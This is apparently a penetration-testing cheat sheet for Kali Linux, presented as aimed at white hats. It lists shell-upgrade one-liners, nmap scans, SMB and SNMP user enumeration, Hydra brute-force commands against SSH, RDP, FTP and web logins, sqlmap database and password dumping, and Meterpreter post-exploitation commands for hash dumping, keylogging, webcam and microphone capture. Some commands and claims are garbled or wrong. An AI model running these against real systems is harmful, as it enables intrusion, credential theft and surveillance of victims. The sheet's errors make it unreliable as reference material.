

# **Kali Help Sheet for White Hats.**


## ​​​🐍​ Python TTY Shell Trick:
`python -c 'import pty;pty.spawn("/bin/bash")'`

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

Spawn Interactive sh shell:
`/bin/sh -i`

Spawn Perl TTY Shell:
`perl -e 'exec "/bin/sh";'`

Spawn Ruby TTY Shel:
`ruby -e 'exec "/bin/sh"'`

Spawn Lua TTY Shell:
`lua -e 'os.execute("/bin/sh")'`

Spawn TTY Shell from Vi:
`:!bash`

Spawn TTY Shell from NMAP:
`!sh`

# 🕵️ Recon and Enumeration

## 🌐 NMAP Commands

Nmap (“Network Mapper”) is a free and open-source utility for network discovery and security auditing. It's a versatile tool used by both systems and network administrators for tasks like network inventory, managing service upgrade schedules, and monitoring host or service uptime. Nmap runs on all major computer operating systems, and official binary packages are available for Linux, Windows, and Mac OS X.

### Commands

| Command | Description |
|---------|-------------|
| `nmap -v -sS -A -T4 target` | Nmap verbose scan, runs syn stealth, T4 timing, OS and service version info, traceroute and scripts against services. |
| `ping sweep sudo nmap -pn target` | Does a ping sweep over the target's network to see all the available IPs. |
| `nmap -v -sS -p–A -T4 target` | As above but scans all TCP ports (takes a lot longer). |
| `nmap -v -sU -sS -p- -A -T4 target` | As above but scans all TCP ports and UDP scan (takes even longer). |
| `nmap -v -p 445 –script=smb-check-vulns --script-args=unsafe=1 192.168.1.X` | Nmap script to scan for vulnerable SMB servers. |
| `nmap localhost` | Displays all the ports that are currently in use. |
| `ls /usr/share/nmap/scripts/* | grep ftp` | Search nmap scripts for keywords. |
  
| Command                     | Description                                            |
|-----------------------------|--------------------------------------------------------|
| nmap <host>                 | Simple host scan                                       |
| nmap <start_ip>-<end_ip>    | Scanning IP address ranges                             |   
| nmap -p <port_range> <host> | Scanning a range of ports                              |
| nmap -p- <host>             | Scan all ports                                         |
| nmap -p 1-1000 <host>       | Scanning of the 1000 most common ports                 |
| nmap -sV <host>             | Scanning services and versions                         |
| nmap -T5 -F <host>          | Quick scan without DNS resolution                      |
| nmap -O <host>              | Scanning operating systems                             |
| nmap --script vuln <host>   | Vulnerability script scannings                         |
| nmap --script <script_name> <host> | Scanning for specific scripts                   |
| nmap -sS <host>             | Stealth scanning (does not generate logs at destination)|
| nmap -sU <host>             | UDP scanning                                           |
| nmap -sn <network>          | Scanning live hosts on a network                       |
| nmap -oX output.xml <host>  | Save results in XML format                             |


# 👤 Username Enumeration

## SMB User Enumeration

| Command | Description |
|---------|-------------|
| `python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.16X.XXX.XXX` | Enumerate users from SMB |
| `ridenum.py 192.16X.XXX.XXX 500 50000 dict.txt` | RID cycle SMB / enumerate users from SMB |
| `enum4linux -U 192.16X.XXX.XXX` | Enumerate SMB usernames using enum4linux |
## SNMP User Enumeration

| Command | Description |
|---------|-------------|
| `snmpwalk public -v1 192.168.X.XXX 1 | grep 77.1.2.25` | Enumerate users from SNMP |
| `python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX` | Enumerate users from SNMP |
| `nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt` | Search for SNMP servers with nmap, grepable output |

# 🔒 Passwords

## Wordlists

| Command | Description |
|---------|-------------|
| `/usr/share/wordlists` | Kali word lists |
| `wget https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt` | Download a popular wordlist from GitHub |

# ​​​​🔑​ Hydra
Hydra is an open source brute force tool used to test the security of passwords on a wide variety of network services, such as FTP, SSH, Telnet, HTTP...

# Hydra Quick Guide
| Command | Description |
|---------|-------------|
| `hydra -h` | Help menu |
| `hydra -C wordlist.txt SERVER_IP -s PORT http-get /` | Basic Authentication Brute Force - Combined Word List|
| `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /` | Basic Authentication Brute Force - User/Password Word Lists |
| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | Login Form Brute Force - User We Know + Password List |
| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4` | SSH Brute Force - User/Password Word Lists |
| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1` | FTP Brute Force - User we know + password list|


## Bruteforce password with user we know

`hydra -l <username> -P /usr/share/wordlists/rockyou.txt http://<IP_Address>`

## Bruteforce username and password
`hydra -L /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt http://<IP_Address>`

## SSH Bruteforce

`hydra -L username.list -P password.list ssh://10.129.202.136 `

## Bruteforce RDP

`hydra -L username.list -P password.list rdp://10.129.202.136`
 
# 👨‍💻​ Compiling Exploits

| Header Files                                         | OS      |
|------------------------------------------------------|---------|
| `process.h, string.h, winbase.h, windows.h, winsock2.h` | Windows |
| `arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, sys/socket.h, sys/types.h, unistd.h` | Linux   |

# Cryptography 🔒 - Hash Lengths

| Hash   | Size      |
|--------|-----------|
| MD5    | 16 Bytes  |
| SHA-1  | 20 Bytes  |
| SHA-256| 32 Bytes  |
| SHA-512| 64 Bytes  |

# Hash Examples

| Hash            | Example                                                           |
|-----------------|-------------------------------------------------------------------|
| MD5             | 8743b52063cd84097a65d1633f5c74f5                                  |
| SHA1            | b89eaac7e61417341b710b727768294d0e6a277b                          |
| SHA-256         | 127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935  |
| SHA-512         | 82a9dda829eb7f8ffe9fbe49e45d47d2dad9664fbb7adf72492e3c81ebd3e29134d9bc12212bf83c6840f10e8246b9db54a4859b7ccd0123d86e5872c1e5082f |

# SQLMap Examples 🐛

| Command                                                                                      | Description                                                                                      |
|----------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------|
| `sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3` | Automated sqlmap scan                                                                           |
| `sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/blah.php"` | Targeted sqlmap scan                                                                        |
| `sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump`         | Scan URL for union + error-based injection with MySQL backend and use a random user agent + database dump |
| `sqlmap -o -u "http://meh.com/form/" --forms`                                                 | SQLMap check form for injection                                                                  |
| `sqlmap -o -u "http://meh/vuln-form" --forms -D database-name -T users --dump`                 | SQLMap dump and crack hashes for table users on database-name                                     |

# Auxilary Metasploit Modules 🔍

| Command                                               | Description                                                   |
|-------------------------------------------------------|---------------------------------------------------------------|
| `searchsploit windows 2003 grep -i local`              | Search exploits for Windows 2003 and filter for local exploits.|
| `site:exploit-db.com exploit kernel <= 3  `              | Google search for kernel exploits on exploit-db.com with version <= 3.|
|` grep -R "W7" /usr/share/metasploit-framework/modules/exploit/windows/*` | Search Metasploit modules for Windows 7 exploits. |
|` msfconsole -q -x "search name:windows type:exploit" `   | Search Metasploit for Windows exploits using a quiet session.  |



## Meterpreter Cheat Sheet ​❗​

| Command                | Description                                          |
|------------------------|------------------------------------------------------|
| upload file c:\\windows | Upload file to Windows target                        |
| download c:\\windows\\repair\\sam /tmp | Download file from Windows target          |
| execute -f c:\\windows\temp\exploit.exe | Run .exe on target                          |
| execute -f cmd -c       | Creates new channel with cmd shell                   |
| ps                     | Show processes                                       |
| shell                  | Get shell on the target                              |
| getsystem              | Attempts privilege escalation on the target           |
| hashdump               | Dump the hashes on the target                         |
| portfwd add –l 3389 –p 3389 –r target | Create port forward to target machine     |
| portfwd delete –l 3389 –p 3389 –r target | Delete port forward                      |
| screenshot             | Capture screenshot of the target machine             |
| keyscan_start          | Start keylogger                                      |
| keyscan_dump           | Dump collected keystrokes                            |
| webcam_snap            | Take webcam snapshot                                 |
| record_mic             | Record microphone                                    |
| enum_chrome            | Enumerate Chrome browser data                        |

## Google Operators DORKS ​​​​​🌐​

| Operator      | Operator Description                                           | Example                          | Example Description                                           |
|---------------|----------------------------------------------------------------|----------------------------------|----------------------------------------------------------------|
| site:         | Limits results to a specific website or domain.                 | `site:example.com`               | Finds all publicly accessible pages on example.com.            |
| inurl:        | Finds pages with a specific term in the URL.                    | `inurl:login`                    | Searches for login pages on any website.                        |
| filetype:     | Searches for files of a particular type.                        | `filetype:pdf`                   | Finds downloadable PDF documents.                              |
| intitle:      | Searches for pages with a specific term in the title.           | `intitle:"confidential report"`  | Searches for documents titled "confidential report".           |
| intext:       | Searches for a term within the body text of pages.              | `intext:"password reset"`        | Identifies web pages containing the term "password reset".     |
| cache:        | Displays the cached version of a web page (if available).       | `cache:example.com`              | Views the cached version of example.com to see its past content.|
| link:         | Finds pages linking to a specific web page.                     | `link:example.com`               | Identifies websites linking to example.com.                    |
| related:      | Finds websites related to a specific web page.                  | `related:example.com`            | Discovers websites similar to example.com.                     |
| info:         | Provides a summary of information about a web page.             | `info:example.com`               | Retrieves basic details about example.com, such as its title and description. |
| define:       | Provides definitions for a word or phrase.                      | `define:phishing`                | Retrieves definitions of "phishing" from various sources.     |
| numrange:     | Searches for numbers within a specific range.                   | `site:example.com numrange:1000-2000` | Searches for pages on example.com containing numbers between 1000 and 2000. |
| allintext:    | Searches for pages containing all specified words in the body text. | `allintext:admin password reset` | Searches for pages containing both "admin" and "password reset" in the body text. |
| allinurl:     | Searches for pages containing all specified words in the URL.   | `allinurl:admin panel`           | Searches for pages with "admin" and "panel" in the URL.        |
| allintitle:   | Searches for pages containing all specified words in the title. | `allintitle:confidential report 2023` | Searches for pages with "confidential", "report", and "2023" in the title. |
| AND           | Limits results to pages that contain all specified terms.       | `site:example.com AND (inurl:admin OR inurl:login)` | Finds admin or login pages specifically on example.com.        |
| OR            | Expands results to include pages with any of the specified terms. | `"linux" OR "ubuntu" OR "debian"` | Searches for web pages mentioning Linux, Ubuntu, or Debian.   |
| NOT           | Excludes results containing the specified term.                 | `site:bank.com NOT inurl:login`  | Searches pages on bank.com, excluding login pages.            |
| * (wildcard)  | Represents any character or word.                               | `site:socialnetwork.com filetype:pdf user* manual` | Searches for user manuals (guide, manual) in PDF format on socialnetwork.com. |
| .. (range search) | Finds results within a specific numerical range.              | `site:ecommerce.com "price" 100..500` | Searches for products priced between 100 and 500 on an ecommerce site. |
| " " (quotes)  | Searches for exact phrases.                                     | `"information security policy"`  | Searches for documents containing the exact phrase "information security policy". |
| - (minus sign) | Excludes terms from search results.                             | `site:news.com -inurl:sports`   | Searches for news articles on news.com, excluding sports-related content. |

### 💀​ Gobuster Fuzzing
Gobuster is an open source directory and subdomain enumeration tool used to discover hidden files and directories on a website.
| Command                                           | Description                                                         |
|---------------------------------------------------|---------------------------------------------------------------------|
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Fuzzing hidden directories on an IP.                                |
| `gobuster dir -u example.com -w /usr/share/dirb/wordlists/directory-list-2.3-medium.txt` | Fuzzing hidden directories on example.com using a medium wordlist.  |
| `gobuster vhost dir -u example.com -w /usr/share/dirb/wordlists/common.txt -t 50` | Fuzzing virtual hosts and directories on example.com with 50 threads. |
| `gobuster dns -d example.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Enumerating subdomains by adding a DNS server like 1.1.1.1 to /etc/resolv.conf. |
| `gobuster dir -u example.com -w /usr/share/dirb/wordlists/directory-list-2.3-medium.txt -f -e` | Returning only requests with positive status codes on example.com.  |










